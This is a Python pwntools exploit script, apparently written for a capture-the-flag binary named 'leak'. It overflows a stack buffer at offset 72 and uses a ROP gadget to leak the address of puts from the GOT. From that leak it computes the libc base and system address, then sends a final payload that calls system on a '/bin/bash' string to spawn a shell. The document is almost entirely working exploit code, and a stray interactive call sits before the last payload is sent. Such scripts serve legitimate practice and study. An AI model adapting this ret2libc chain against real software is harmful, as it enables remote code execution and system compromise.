#! /usr/bin/python3
from pwn import *
from ast import literal_eval

p = process('./leak')

""" Phase 1: Gain control of EIP """
offset=72
main_addr=0x40082f
#ret = b"\x42\x42\x42\x42\x42\x42\x00\x00"
ret = p64(main_addr)
shell_string_in_stack=b"/bin/bash\x00\x00\x00\x00\x00\x00"

payload = shell_string_in_stack + b"A" * (offset - len(shell_string_in_stack)) + ret
#p.sendline(payload)

""" Phase 2: Collect GOT and PLT addresses + Find a suitable ROP Gadget """
# https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got
# https://codingvision.net/bypassing-aslr-dep-getting-shells-with-pwntools
puts_got=0x0000000000601018
pop_rdi_ret_gadget=0x00000000004008f3
puts_plt=0x0000000000400610

p.recvline() # > Ops, i'm leaking
p.recvline() # > Pwn Me ...

payload = b"A" * offset + p64(pop_rdi_ret_gadget) + p64(puts_got) + p64(puts_plt) + ret
p.sendline(payload)

leaked_output = p.recvline()[2:-1]
leaked_output += b'\x00\x00'
print(leaked_output)

leaked_rsp = p.recvline() # > Ops, I'm leaking
print(leaked_rsp)
leaked_rsp = p64(int(leaked_rsp[19:-1],16))
print(p.recvline())

""" Phase 3: Find libc system call by offset """
puts_libc_leaked_address=u64(leaked_output)
system_libc_offset=0x000000000004a820
puts_libc_offset=0x00000000000743c0
base_libc_address = puts_libc_leaked_address - puts_libc_offset
system_libc_address = base_libc_address + system_libc_offset

p.interactive()
payload = b'A' * offset + p64(pop_rdi_ret_gadget) + leaked_rsp + p64(system_libc_address)
p.sendline(payload)

#p.recvline()
p.interactive()



